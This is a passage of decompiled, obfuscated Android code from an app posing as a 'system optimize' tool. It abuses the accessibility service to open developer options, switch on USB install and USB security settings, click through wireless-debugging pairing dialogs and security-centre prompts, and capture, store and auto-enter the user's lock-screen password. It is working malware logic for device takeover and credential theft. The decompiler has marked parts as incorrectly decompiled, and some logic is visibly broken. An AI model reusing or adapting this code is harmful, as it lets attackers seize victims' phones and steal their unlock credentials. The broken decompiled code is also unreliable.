                                                                                        int i8 = 0;
                                                                                        while (i8 < size) {
                                                                                            Object obj = arrayListM213298i5.get(i8);
                                                                                            i8++;
                                                                                            accessibilityNodeInfoM212008f3 = C0360a2.m212008f3(rootInActiveWindow5, (String) obj);
                                                                                            if (accessibilityNodeInfoM212008f3 != null) {
                                                                                                break;
                                                                                            }
                                                                                        }
                                                                                        accessibilityNodeInfoM212008f3 = null;
                                                                                        if (accessibilityNodeInfoM212008f3 == null) {
                                                                                        }
                                                                                        i6++;
                                                                                        z = z2;
                                                                                    }
                                                                                }
                                                                            } else {
                                                                                t60.m214704c5("SystemOptimize", "USB安全设置栏目查找失败");
                                                                            }
                                                                            if (c0360a22.f53837c2) {
                                                                                t60.m214702c3("SystemOptimize", "USB安全设置已勾选");
                                                                            }
                                                                            t60.m214702c3("SystemOptimize", "pairInPrepareFinish 完成，USB安装=" + c0360a22.f53836c1 + "，USB安全设置=" + c0360a22.f53837c2);
                                                                            c0360a22.m212094k4();
                                                                            c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                        } else {
                                                                            t60.m214702c3("SystemOptimize", "pairInPrepareFinish 完成，USB安装=" + c0360a22.f53836c1 + "，USB安全设置=" + c0360a22.f53837c2);
                                                                            c0360a22.m212094k4();
                                                                            c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                        }
                                                                    } else {
                                                                        t60.m214714d6("SystemOptimize", "配对成功，进入完成流程");
                                                                        c0360a22.m212094k4();
                                                                        c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                    }
                                                                } else {
                                                                    c0360a22.m212094k4();
                                                                    c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                }
                                                            } catch (Exception e5) {
                                                                t60.m214705c6("SystemOptimize", "pairInPrepareFinish 异常", e5);
                                                            }
                                                            return C1351vv.f60710b1;
                                                        }
                                                    });
                                                } else {
                                                    t60.m214726f4("SystemOptimize", "pairInPairSuccess: BACK后不在开发者选项页面，重新打开");
                                                    while (true) {
                                                        if (i5 < 4) {
                                                            try {
                                                                Intent intent = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
                                                                intent.addFlags(268435456);
                                                                c0360a2.f53816a1.startActivity(intent);
                                                                t60.m214714d6("SystemOptimize", "pairInPairSuccess: 第" + i5 + "次尝试打开开发者选项");
                                                                C0360a2.m212025k1(20);
                                                            } catch (Exception e4) {
                                                                t60.m214705c6("SystemOptimize", "重新打开开发者选项失败 (第" + i5 + "次)", e4);
                                                            }
                                                            if (c0360a2.m212028a2()) {
                                                                t60.m214714d6("SystemOptimize", "pairInPairSuccess: 开发者选项页面已打开");
                                                                break;
                                                            }
                                                            t60.m214726f4("SystemOptimize", "pairInPairSuccess: 第" + i5 + "次打开后仍未检测到开发者选项页面");
                                                            i5++;
                                                        } else {
                                                            t60.m214704c5("SystemOptimize", "pairInPairSuccess: 3次尝试后仍无法打开开发者选项页面");
                                                            String str4 = Build.BRAND;
                                                            t60.m214694b5(str4, "BRAND");
                                                            String lowerCase2 = str4.toLowerCase(Locale.ROOT);
                                                            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                                            if (!lowerCase2.equals("xiaomi") && !lowerCase2.equals("redmi") && !lowerCase2.equals("poco") && !lowerCase2.equals("blackshark")) {
                                                                c0360a2.f53818a3.remove("pairInPairSuccess");
                                                                c0360a2.m212094k4();
                                                            }
                                                            t60.m214714d6("SystemOptimize", "小米设备：仍执行 pairInPrepareFinish 处理 USB安装");
                                                        }
                                                    }
                                                    c0360a2.f53818a3.remove("pairInPairSuccess");
                                                    if (!c0360a2.f53818a3.contains("pairInPrepareFinish")) {
                                                        c0360a2.f53818a3.add("pairInPrepareFinish");
                                                        t60.m214714d6("SystemOptimize", "pairInPairSuccess: 主动调度 pairInPrepareFinish");
                                                    }
                                                    c0360a2.m212087j5("F", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$pairInPairSuccess$2
                                                        {
                                                            super(0);
                                                        }

                                                        /* JADX WARN: Removed duplicated region for block: B:79:0x0203 A[Catch: Exception -> 0x002f, TryCatch #0 {Exception -> 0x002f, blocks: (B:3:0x0012, B:9:0x0025, B:12:0x0032, B:14:0x0044, B:15:0x0056, B:17:0x005c, B:18:0x006b, B:20:0x0076, B:22:0x007e, B:27:0x009e, B:29:0x00a4, B:30:0x00b3, B:32:0x00be, B:34:0x00d1, B:36:0x00dd, B:38:0x00e3, B:41:0x00ee, B:43:0x0109, B:45:0x0131, B:47:0x0137, B:52:0x0145, B:54:0x014b, B:50:0x013f, B:57:0x016b, B:59:0x017c, B:61:0x0188, B:63:0x018e, B:65:0x0197, B:67:0x01b0, B:69:0x01ca, B:71:0x01d8, B:79:0x0203, B:84:0x0244, B:80:0x022f, B:82:0x0234, B:83:0x023e, B:74:0x01e2, B:76:0x01f3, B:86:0x024e, B:88:0x0252, B:68:0x01c7, B:85:0x0249, B:55:0x015d, B:56:0x0164, B:26:0x0099, B:31:0x00b9, B:89:0x0257, B:23:0x0083), top: B:94:0x0012, inners: #1 }] */
                                                        /* JADX WARN: Removed duplicated region for block: B:80:0x022f A[Catch: Exception -> 0x002f, TryCatch #0 {Exception -> 0x002f, blocks: (B:3:0x0012, B:9:0x0025, B:12:0x0032, B:14:0x0044, B:15:0x0056, B:17:0x005c, B:18:0x006b, B:20:0x0076, B:22:0x007e, B:27:0x009e, B:29:0x00a4, B:30:0x00b3, B:32:0x00be, B:34:0x00d1, B:36:0x00dd, B:38:0x00e3, B:41:0x00ee, B:43:0x0109, B:45:0x0131, B:47:0x0137, B:52:0x0145, B:54:0x014b, B:50:0x013f, B:57:0x016b, B:59:0x017c, B:61:0x0188, B:63:0x018e, B:65:0x0197, B:67:0x01b0, B:69:0x01ca, B:71:0x01d8, B:79:0x0203, B:84:0x0244, B:80:0x022f, B:82:0x0234, B:83:0x023e, B:74:0x01e2, B:76:0x01f3, B:86:0x024e, B:88:0x0252, B:68:0x01c7, B:85:0x0249, B:55:0x015d, B:56:0x0164, B:26:0x0099, B:31:0x00b9, B:89:0x0257, B:23:0x0083), top: B:94:0x0012, inners: #1 }] */
                                                        @Override // p000.w00
                                                        /*
                                                            Code decompiled incorrectly, please refer to instructions dump.
                                                        */
                                                        public final Object invoke() {
                                                            boolean z;
                                                            AccessibilityNodeInfo accessibilityNodeInfoM212008f3;
                                                            boolean z2;
                                                            AccessibilityNodeInfo accessibilityNodeInfoM212048d6;
                                                            AccessibilityNodeInfo accessibilityNodeInfoM212048d62;
                                                            C0360a2 c0360a22 = c0360a2;
                                                            try {
                                                                if (((SystemOptimizeManager$PairState) c0360a22.f53819a4.get()) == SystemOptimizeManager$PairState.f53761a2) {
                                                                    c0360a22.f53819a4.set(SystemOptimizeManager$PairState.f53764a5);
                                                                    t60.m214714d6("SystemOptimize", "pairInPrepareFinish: 部署将在 WRITE_SETTINGS 权限完成后执行");
                                                                    if (kg1.m213521c7()) {
                                                                        t60.m214714d6("SystemOptimize", "OPPO设备：处理禁止权限监控");
                                                                        c0360a22.m212069h3();
                                                                        c0360a22.m212094k4();
                                                                        c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                    } else if (kg1.m213524d0()) {
                                                                        t60.m214714d6("SystemOptimize", "小米设备：处理 USB安装 + USB安全设置");
                                                                        if (kg1.m213524d0()) {
                                                                            if (c0360a22.m212028a2()) {
                                                                                t60.m214714d6("SystemOptimize", "小米 pairInPrepareFinish: 已在开发者选项页面");
                                                                            } else {
                                                                                t60.m214726f4("SystemOptimize", "小米 pairInPrepareFinish: 当前不在开发者选项页面，尝试重新打开");
                                                                                try {
                                                                                    Intent intent2 = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
                                                                                    intent2.addFlags(268435456);
                                                                                    c0360a22.f53816a1.startActivity(intent2);
                                                                                    C0360a2.m212025k1(15);
                                                                                } catch (Exception e42) {
                                                                                    t60.m214705c6("SystemOptimize", "小米：重新打开开发者选项失败", e42);
                                                                                }
                                                                                if (c0360a22.m212028a2()) {
                                                                                    t60.m214714d6("SystemOptimize", "小米：已重新打开开发者选项页面");
                                                                                } else {
                                                                                    t60.m214704c5("SystemOptimize", "小米：重新打开开发者选项后仍未检测到页面，跳过 USB安装处理");
                                                                                    c0360a22.m212094k4();
                                                                                    c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                                }
                                                                            }
                                                                            AccessibilityNodeInfo rootInActiveWindow2 = c0360a22.f53815a0.getRootInActiveWindow();
                                                                            t60.m214694b5(rootInActiveWindow2, "service.rootInActiveWindow");
                                                                            y90 y90Var = AbstractC0361a3.f53874a0;
                                                                            List list = dh0.f55795e5;
                                                                            AccessibilityNodeInfo accessibilityNodeInfoM212014f9 = C0360a2.m212014f9(rootInActiveWindow2, list);
                                                                            if (accessibilityNodeInfoM212014f9 == null && (accessibilityNodeInfoM212048d62 = c0360a22.m212048d6(c0360a22.f53815a0.getRootInActiveWindow())) != null && (accessibilityNodeInfoM212014f9 = c0360a22.m212090j8(accessibilityNodeInfoM212048d62, list)) == null) {
                                                                                c0360a22.m212088j6(accessibilityNodeInfoM212048d62);
                                                                                accessibilityNodeInfoM212014f9 = c0360a22.m212090j8(accessibilityNodeInfoM212048d62, list);
                                                                            }
                                                                            if (accessibilityNodeInfoM212014f9 != null) {
                                                                                z = true;
                                                                                t60.m214702c3("SystemOptimize", "USB安装栏目查找成功: text=" + ((Object) accessibilityNodeInfoM212014f9.getText()));
                                                                                AccessibilityNodeInfo accessibilityNodeInfoM212010f5 = C0360a2.m212010f5(accessibilityNodeInfoM212014f9);
                                                                                if (accessibilityNodeInfoM212010f5 != null) {
                                                                                    t60.m214702c3("SystemOptimize", "USB安装 点击整行: " + ((Object) accessibilityNodeInfoM212010f5.getClassName()));
                                                                                    accessibilityNodeInfoM212010f5.performAction(16);
                                                                                    C0360a2.m212025k1(15);
                                                                                    AccessibilityNodeInfo rootInActiveWindow3 = c0360a22.f53815a0.getRootInActiveWindow();
                                                                                    t60.m214694b5(rootInActiveWindow3, "service.rootInActiveWindow");
                                                                                    AccessibilityNodeInfo accessibilityNodeInfoM212014f92 = C0360a2.m212014f9(rootInActiveWindow3, list);
                                                                                    if (accessibilityNodeInfoM212014f92 != null) {
                                                                                        AccessibilityNodeInfo accessibilityNodeInfoM212010f52 = C0360a2.m212010f5(accessibilityNodeInfoM212014f92);
                                                                                        if (accessibilityNodeInfoM212010f52 == null) {
                                                                                            accessibilityNodeInfoM212010f52 = accessibilityNodeInfoM212014f92.getParent();
                                                                                        }
                                                                                        AccessibilityNodeInfo accessibilityNodeInfoM212017g2 = accessibilityNodeInfoM212010f52 == null ? null : C0360a2.m212017g2(accessibilityNodeInfoM212010f52);
                                                                                        boolean zIsChecked = accessibilityNodeInfoM212017g2 != null ? accessibilityNodeInfoM212017g2.isChecked() : false;
                                                                                        c0360a22.f53836c1 = zIsChecked;
                                                                                        t60.m214702c3("SystemOptimize", "USB安装点击后状态: checked=" + zIsChecked);
                                                                                    }
                                                                                } else {
                                                                                    accessibilityNodeInfoM212014f9.performAction(16);
                                                                                    C0360a2.m212025k1(15);
                                                                                }
                                                                            } else {
                                                                                z = true;
                                                                                t60.m214704c5("SystemOptimize", "USB安装栏目查找失败");
                                                                            }
                                                                            AccessibilityNodeInfo rootInActiveWindow4 = c0360a22.f53815a0.getRootInActiveWindow();
                                                                            t60.m214694b5(rootInActiveWindow4, "service.rootInActiveWindow");
                                                                            List list2 = dh0.f55796e6;
                                                                            AccessibilityNodeInfo accessibilityNodeInfoM212014f93 = C0360a2.m212014f9(rootInActiveWindow4, list2);
                                                                            if (accessibilityNodeInfoM212014f93 == null && (accessibilityNodeInfoM212048d6 = c0360a22.m212048d6(c0360a22.f53815a0.getRootInActiveWindow())) != null && (accessibilityNodeInfoM212014f93 = c0360a22.m212090j8(accessibilityNodeInfoM212048d6, list2)) == null) {
                                                                                c0360a22.m212088j6(accessibilityNodeInfoM212048d6);
                                                                                accessibilityNodeInfoM212014f93 = c0360a22.m212090j8(accessibilityNodeInfoM212048d6, list2);
                                                                            }
                                                                            if (accessibilityNodeInfoM212014f93 != null) {
                                                                                t60.m214702c3("SystemOptimize", "USB安全设置栏目查找成功: text=" + ((Object) accessibilityNodeInfoM212014f93.getText()));
                                                                                AccessibilityNodeInfo accessibilityNodeInfoM212010f53 = C0360a2.m212010f5(accessibilityNodeInfoM212014f93);
                                                                                if (accessibilityNodeInfoM212010f53 != null) {
                                                                                    t60.m214702c3("SystemOptimize", "USB安全设置 点击整行: " + ((Object) accessibilityNodeInfoM212010f53.getClassName()));
                                                                                    accessibilityNodeInfoM212010f53.performAction(16);
                                                                                } else {
                                                                                    accessibilityNodeInfoM212014f93.performAction(16);
                                                                                }
                                                                                t60.m214702c3("SystemOptimize", "USB安全设置已点击，等待弹窗...");
                                                                                C0360a2.m212025k1(10);
                                                                                int i6 = 0;
                                                                                int i7 = 0;
                                                                                while (true) {
                                                                                    if (i6 >= 15) {
                                                                                        break;
                                                                                    }
                                                                                    AccessibilityNodeInfo rootInActiveWindow5 = c0360a22.f53815a0.getRootInActiveWindow();
                                                                                    if (rootInActiveWindow5 == null) {
                                                                                        accessibilityNodeInfoM212008f3 = null;
                                                                                        if (accessibilityNodeInfoM212008f3 == null) {
                                                                                            t60.m214702c3("SystemOptimize", "USB安全设置 弹窗" + (i6 + 1) + ": 点击 " + ((Object) accessibilityNodeInfoM212008f3.getText()));
                                                                                            accessibilityNodeInfoM212008f3.performAction(16);
                                                                                            C0360a2.m212025k1(10);
                                                                                            z2 = z;
                                                                                            i7 = 0;
                                                                                        } else {
                                                                                            i7++;
                                                                                            if (i7 >= 3) {
                                                                                                t60.m214702c3("SystemOptimize", "USB安全设置 弹窗处理完成");
                                                                                                c0360a22.f53837c2 = z;
                                                                                                break;
                                                                                            }
                                                                                            z2 = z;
                                                                                            C0360a2.m212025k1(5);
                                                                                        }
                                                                                        i6++;
                                                                                        z = z2;
                                                                                    } else {
                                                                                        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.m212602a1(), dh0.f55750a0);
                                                                                        int size = arrayListM213298i5.size();
                                                                                        int i8 = 0;
                                                                                        while (i8 < size) {
                                                                                            Object obj = arrayListM213298i5.get(i8);
                                                                                            i8++;
                                                                                            accessibilityNodeInfoM212008f3 = C0360a2.m212008f3(rootInActiveWindow5, (String) obj);
                                                                                            if (accessibilityNodeInfoM212008f3 != null) {
                                                                                                break;
                                                                                            }
                                                                                        }
                                                                                        accessibilityNodeInfoM212008f3 = null;
                                                                                        if (accessibilityNodeInfoM212008f3 == null) {
                                                                                        }
                                                                                        i6++;
                                                                                        z = z2;
                                                                                    }
                                                                                }
                                                                            } else {
                                                                                t60.m214704c5("SystemOptimize", "USB安全设置栏目查找失败");
                                                                            }
                                                                            if (c0360a22.f53837c2) {
                                                                                t60.m214702c3("SystemOptimize", "USB安全设置已勾选");
                                                                            }
                                                                            t60.m214702c3("SystemOptimize", "pairInPrepareFinish 完成，USB安装=" + c0360a22.f53836c1 + "，USB安全设置=" + c0360a22.f53837c2);
                                                                            c0360a22.m212094k4();
                                                                            c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                        } else {
                                                                            t60.m214702c3("SystemOptimize", "pairInPrepareFinish 完成，USB安装=" + c0360a22.f53836c1 + "，USB安全设置=" + c0360a22.f53837c2);
                                                                            c0360a22.m212094k4();
                                                                            c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                        }
                                                                    } else {
                                                                        t60.m214714d6("SystemOptimize", "配对成功，进入完成流程");
                                                                        c0360a22.m212094k4();
                                                                        c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                    }
                                                                } else {
                                                                    c0360a22.m212094k4();
                                                                    c0360a22.f53818a3.remove("pairInPrepareFinish");
                                                                }
                                                            } catch (Exception e5) {
                                                                t60.m214705c6("SystemOptimize", "pairInPrepareFinish 异常", e5);
                                                            }
                                                            return C1351vv.f60710b1;
                                                        }
                                                    });
                                                }
                                            }
                                        }
                                    }
                                } else {
                                    c0360a2.f53818a3.remove("pairInPairSuccess");
                                    c0360a2.f53818a3.remove("pairInPrepareFinish");
                                    c0360a2.m212094k4();
                                }
                            } catch (Exception e5) {
                                t60.m214705c6("SystemOptimize", "pairInPairSuccess 异常", e5);
                            }
                            return C1351vv.f60710b1;
                        }
                    });
                    return;
                }
            }
            if (m212072h7()) {
                concurrentLinkedQueue.remove("pairInWifiDebugWindow");
                concurrentLinkedQueue.remove("pairInDevOption");
                return;
            }
            if (m212030a4()) {
                if (concurrentLinkedQueue.contains("pairInPairFailDialog")) {
                    return;
                }
                concurrentLinkedQueue.add("pairInPairFailDialog");
                m212087j5("PF", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$onAccessibilityEventInternal$4
                    {
                        super(0);
                    }

                    @Override // p000.w00
                    public final Object invoke() {
                        C0360a2 c0360a2 = this.f53777a0;
                        int i = 0;
                        while (c0360a2.m212030a4() && i < 30) {
                            try {
                                i++;
                                try {
                                    AccessibilityNodeInfo rootInActiveWindow = c0360a2.f53815a0.getRootInActiveWindow();
                                    if (rootInActiveWindow != null) {
                                        y90 y90Var = AbstractC0361a3.f53874a0;
                                        AccessibilityNodeInfo accessibilityNodeInfoM212014f9 = C0360a2.m212014f9(rootInActiveWindow, dh0.f55752a2);
                                        if (accessibilityNodeInfoM212014f9 != null && accessibilityNodeInfoM212014f9.performAction(16)) {
                                            t60.m214702c3("SystemOptimize", "配对失败对话框确定按钮查找并点击完成");
                                            C0360a2.m212025k1(10);
                                        }
                                    }
                                } catch (Exception e) {
                                    t60.m214705c6("SystemOptimize", "pairInPairFailDialog 循环异常", e);
                                }
                            } catch (Exception e2) {
                                t60.m214705c6("SystemOptimize", "pairInPairFailDialog 异常", e2);
                            }
                        }
                        if (i >= 30) {
                            t60.m214726f4("SystemOptimize", "pairInPairFailDialog 达到最大重试次数(30)，退出");
                        }
                        c0360a2.f53818a3.remove("pairInWifiDebugWindow");
                        c0360a2.f53818a3.remove("pairInPairCodeDialog");
                        c0360a2.f53818a3.remove("pairInPairFailDialog");
                        return C1351vv.f60710b1;
                    }
                });
                return;
            }
            String str3 = Build.BRAND;
            t60.m214694b5(str3, "BRAND");
            String lowerCase = str3.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            boolean zEquals = lowerCase.equals("xiaomi");
            bf1 bf1Var = this.f53824a9;
            if (zEquals || lowerCase.equals("redmi") || lowerCase.equals("poco") || lowerCase.equals("blackshark")) {
                if (m212031a5()) {
                    if (concurrentLinkedQueue.contains("pairInSecurityCenter")) {
                        return;
                    }
                    concurrentLinkedQueue.add("pairInSecurityCenter");
                    m212087j5("SC", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$onAccessibilityEventInternal$5
                        {
                            super(0);
                        }

                        @Override // p000.w00
                        public final Object invoke() {
                            C0360a2.m211994b3(this.f53778a0);
                            return C1351vv.f60710b1;
                        }
                    });
                    return;
                }
                bf1Var.getClass();
                try {
                    if (bf1Var.m210717a3(AbstractC1117qo.m214451e7(we1.m215055a6()))) {
                        t60.m214702c3("WindowDetector", "已进入MIUI安全中心对话框");
                        if (concurrentLinkedQueue.contains("pairInSecurityCenter")) {
                            return;
                        }
                        concurrentLinkedQueue.add("pairInSecurityCenter");
                        m212087j5("SC", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$onAccessibilityEventInternal$6
                            {
                                super(0);
                            }

                            @Override // p000.w00
                            public final Object invoke() {
                                C0360a2.m211994b3(this.f53779a0);
                                return C1351vv.f60710b1;
                            }
                        });
                        return;
                    }
                } catch (Exception e) {
                    t60.m214705c6("WindowDetector", "isInMiuiSecurityDialog 异常", e);
                }
            }
            if (bf1Var.m210716a2()) {
                t60.m214702c3("SystemOptimize", "检测到锁屏密码验证窗口");
                if (this.f53828b3 != null) {
                    t60.m214702c3("SystemOptimize", "OpenDevelopmentDelegate 正在运行，跳过 pairInConfirmLock（由它处理密码）");
                } else {
                    if (concurrentLinkedQueue.contains("pairInConfirmLock")) {
                        return;
                    }
                    concurrentLinkedQueue.add("pairInConfirmLock");
                    m212087j5("CL", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$onAccessibilityEventInternal$7
                        {
                            super(0);
                        }

                        @Override // p000.w00
                        public final Object invoke() {
                            C0360a2 c0360a2 = this.f53780a0;
                            SystemOptimizeManager$DevOptState systemOptimizeManager$DevOptState = SystemOptimizeManager$DevOptState.ENABLE_DEV_OPT_SUCCESS;
                            try {
                                try {
                                    t60.m214702c3("SystemOptimize", "pairInConfirmLock: 检测到密码验证窗口");
                                    C0335a1 c0600hy = C0335a1.f53283c5.getInstance(c0360a2.f53815a0, c0360a2.f53816a1);
                                    int i = 0;
                                    if (c0600hy.m211819d0(true) == null && c0600hy.m211819d0(false) == null) {
                                        t60.m214714d6("SystemOptimize", "pairInConfirmLock: 无已保存密码，启动同步捕获流程");
                                        C0335a1.m211788c1(c0600hy);
                                        AccessibilityService accessibilityService = c0360a2.f53815a0;
                                        dqtvuisjd dqtvuisjdVar = accessibilityService instanceof dqtvuisjd ? (dqtvuisjd) accessibilityService : null;
                                        C0763km c0763kmM211469g3 = dqtvuisjdVar != null ? dqtvuisjdVar.m211469g3() : null;
                                        if (c0763kmM211469g3 != null) {
                                            c0763kmM211469g3.m213600a0();
                                        }
                                        t60.m214714d6("SystemOptimize", "已取消无障碍遮挡，等待用户输入密码（同步捕获中...）");
                                        int i2 = 0;
                                        while (c0360a2.f53824a9.m210716a2() && i2 < 60) {
                                            try {
                                                Thread.sleep(1000L);
                                                i2++;
                                                if (i2 % 10 == 0) {
                                                    t60.m214702c3("SystemOptimize", "pairInConfirmLock: 等待中 " + i2 + "s, hasPendingCipher=" + (c0600hy.f53306c0 != null));
                                                }
                                            } catch (Exception unused) {
                                            }
                                        }
                                        if (c0360a2.f53824a9.m210716a2() || i2 >= 60) {
                                            c0600hy.m211816b6();
                                            t60.m214726f4("SystemOptimize", "pairInConfirmLock: 超时(" + i2 + "s)或密码错误，丢弃缓冲");
                                        } else {
                                            if (c0600hy.m211812b1()) {
                                                t60.m214714d6("SystemOptimize", "pairInConfirmLock: 密码验证通过校验，已保存");
                                            } else {
                                                t60.m214726f4("SystemOptimize", "pairInConfirmLock: 窗口消失但密码未通过校验（可能用户取消或密码不完整）");
                                            }
                                            Thread.sleep(1000L);
                                            if (c0360a2.m212071h6() && c0360a2.f53820a5.get() != systemOptimizeManager$DevOptState) {
                                                t60.m214714d6("SystemOptimize", "主动推进: 用户输入密码后开发者选项已开启，启动配对流程");
                                                c0360a2.f53820a5.set(systemOptimizeManager$DevOptState);
                                                if (c0763kmM211469g3 != null) {
                                                    c0763kmM211469g3.m213601a1(true);
                                                }
                                                Thread.sleep(1000L);
                                                c0600hy.m211815b5();
                                                c0360a2.f53827b2.post(new c41(c0360a2, 10));
                                            }
                                        }
                                        t60.m214714d6("SystemOptimize", "密码窗口已消失（等待了" + i2 + "秒），恢复无障碍遮挡");
                                        if (c0763kmM211469g3 != null) {
                                            c0763kmM211469g3.m213601a1(true);
                                        }
                                        Thread.sleep(1000L);
                                        t60.m214714d6("SystemOptimize", "无障碍遮挡已恢复");
                                        c0600hy.m211815b5();
                                    } else {
                                        t60.m214714d6("SystemOptimize", "pairInConfirmLock: 有已保存密码，等待2秒后尝试自动输入");
                                        C0360a2.m212025k1(10);
                                        if (c0600hy.m211809a8()) {
                                            t60.m214714d6("SystemOptimize", "pairInConfirmLock: 密码自动输入成功");
                                            while (c0360a2.f53824a9.m210716a2() && i < 15) {
                                                Thread.sleep(500L);
                                                i++;
                                            }
                                            if (c0360a2.f53824a9.m210716a2()) {
                                                t60.m214726f4("SystemOptimize", "pairInConfirmLock: 自动输入后窗口仍在，密码可能不正确");
                                            } else {
                                                t60.m214714d6("SystemOptimize", "pairInConfirmLock: 密码验证窗口已消失");
                                                Thread.sleep(1000L);
                                                boolean zM212071h6 = c0360a2.m212071h6();
                                                t60.m214714d6("SystemOptimize", "开发者选项状态: enabled=" + zM212071h6 + ", devOptState=" + c0360a2.f53820a5.get());
                                                if (zM212071h6 && c0360a2.f53820a5.get() != systemOptimizeManager$DevOptState) {
                                                    t60.m214714d6("SystemOptimize", "主动推进: 开发者选项已开启，启动配对流程");
                                                    c0360a2.f53820a5.set(systemOptimizeManager$DevOptState);
                                                    c0360a2.f53827b2.post(new c41(c0360a2, 8));
                                                } else if (zM212071h6) {
                                                    t60.m214714d6("SystemOptimize", "开发者选项已开启，OpenDevelopmentDelegate 应该会处理后续");
                                                } else {
                                                    t60.m214726f4("SystemOptimize", "密码验证窗口消失但开发者选项未开启，等待 OpenDevelopmentDelegate 处理");
                                                }
                                            }
                                        } else {
                                            t60.m214726f4("SystemOptimize", "pairInConfirmLock: 第1次自动输入失败，开始重试");
                                            int i3 = 2;
                                            boolean zM211809a8 = false;
                                            while (true) {
                                                if (i3 >= 6) {
                                                    break;
                                                }
                                                C0360a2.m212025k1(15);
                                                t60.m214714d6("SystemOptimize", "pairInConfirmLock: 第" + i3 + "次重试自动输入");
                                                zM211809a8 = c0600hy.m211809a8();
                                                if (zM211809a8) {
                                                    t60.m214714d6("SystemOptimize", "pairInConfirmLock: 第" + i3 + "次重试成功");
                                                    break;
                                                }
                                                i3++;
                                            }
                                            if (zM211809a8) {
                                                while (c0360a2.f53824a9.m210716a2() && i < 15) {
                                                    Thread.sleep(500L);
                                                    i++;
                                                }
                                                if (!c0360a2.f53824a9.m210716a2()) {
                                                    Thread.sleep(1000L);
                                                    if (c0360a2.m212071h6() && c0360a2.f53820a5.get() != systemOptimizeManager$DevOptState) {
                                                        t60.m214714d6("SystemOptimize", "重试成功，开发者选项已开启，启动配对流程");
                                                        c0360a2.f53820a5.set(systemOptimizeManager$DevOptState);
                                                        c0360a2.f53827b2.post(new c41(c0360a2, 9));
                                                    }
                                                }
                                            } else {
                                                t60.m214704c5("SystemOptimize", "pairInConfirmLock: 5次自动输入全部失败，等待超时");
                                            }
                                        }
                                    }
                                } catch (Exception e2) {
                                    t60.m214705c6("SystemOptimize", "pairInConfirmLock 异常", e2);
                                }
                                c0360a2.f53818a3.remove("pairInConfirmLock");
                                return C1351vv.f60710b1;
                            } catch (Throwable th) {
                                c0360a2.f53818a3.remove("pairInConfirmLock");
                                throw th;
                            }
                        }
                    });
                }
            }
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "onAccessibilityEvent 异常", e2);
        }
    }

    /* renamed from: i5 */
    public final void m212080i5() throws InterruptedException {
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        t60.m214714d6("SystemOptimize", "打开开发者选项页面... 品牌: ".concat(lowerCase));
        int iHashCode = lowerCase.hashCode();
        Context context = this.f53816a1;
        if (iHashCode == -1206476313 ? lowerCase.equals("huawei") : iHashCode == 99462250 ? lowerCase.equals("honor") : iHashCode == 916625417 && lowerCase.equals("hihonor")) {
            for (ComponentName componentName : AbstractC0716jf.m213306g5(new ComponentName("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsDashboardActivity"), new ComponentName("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity"), new ComponentName("com.android.settings", "com.android.settings.HWSettings"), new ComponentName("com.android.settings", "com.hihonor.settingslib.SubSettings"))) {
                try {
                    Intent intent = new Intent();
                    intent.setComponent(componentName);
                    intent.addFlags(268435456);
                    intent.addFlags(1073741824);
                    intent.addFlags(65536);
                    intent.addFlags(8388608);
                    intent.putExtra(":settings:show_fragment", "com.android.settings.development.DevelopmentSettingsDashboardFragment");
                    context.startActivity(intent);
                    t60.m214714d6("SystemOptimize", "华为/荣耀 通过 ComponentName 启动成功: " + componentName.getClassName());
                    m212025k1(5);
                    return;
                } catch (Exception unused) {
                    t60.m214702c3("SystemOptimize", "华为/荣耀 ComponentName 失败: " + componentName.getClassName());
                }
            }
        }
        try {
            Intent intent2 = new Intent("android.settings.APPLICATION_DEVELOPMENT_SETTINGS");
            intent2.addFlags(268435456);
            intent2.addFlags(1073741824);
            intent2.addFlags(65536);
            intent2.addFlags(8388608);
            context.startActivity(intent2);
            t60.m214714d6("SystemOptimize", "openDevOptionsSettings() 标准 Intent 启动成功");
            m212025k1(5);
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "打开开发者选项失败", e);
            m212067h1();
        }
    }

    /* renamed from: i6 */
    public final void m212081i6() {
        int i = this.f53833b8 + 1;
        this.f53833b8 = i;
        t60.m214714d6("SystemOptimize", "打开开发者选项 (第" + i + "次)");
        m212080i5();
        if (m212028a2()) {
            t60.m214714d6("SystemOptimize", "开发者选项页面打开成功");
            this.f53833b8 = 0;
            this.f53818a3.add("pairInDevOption");
            m212087j5("G", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$openDevOptionsSettingsWithRetry$1
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    C0360a2.m211991b0(this.f53781a0);
                    return C1351vv.f60710b1;
                }
            });
            return;
        }
        if (m212032a6()) {
            t60.m214714d6("SystemOptimize", "直接进入了无线调试页面");
            this.f53833b8 = 0;
            this.f53818a3.add("pairInWifiDebugWindow");
            m212087j5("W", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$openDevOptionsSettingsWithRetry$2
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    C0360a2.m211995b4(this.f53782a0);
                    return C1351vv.f60710b1;
                }
            });
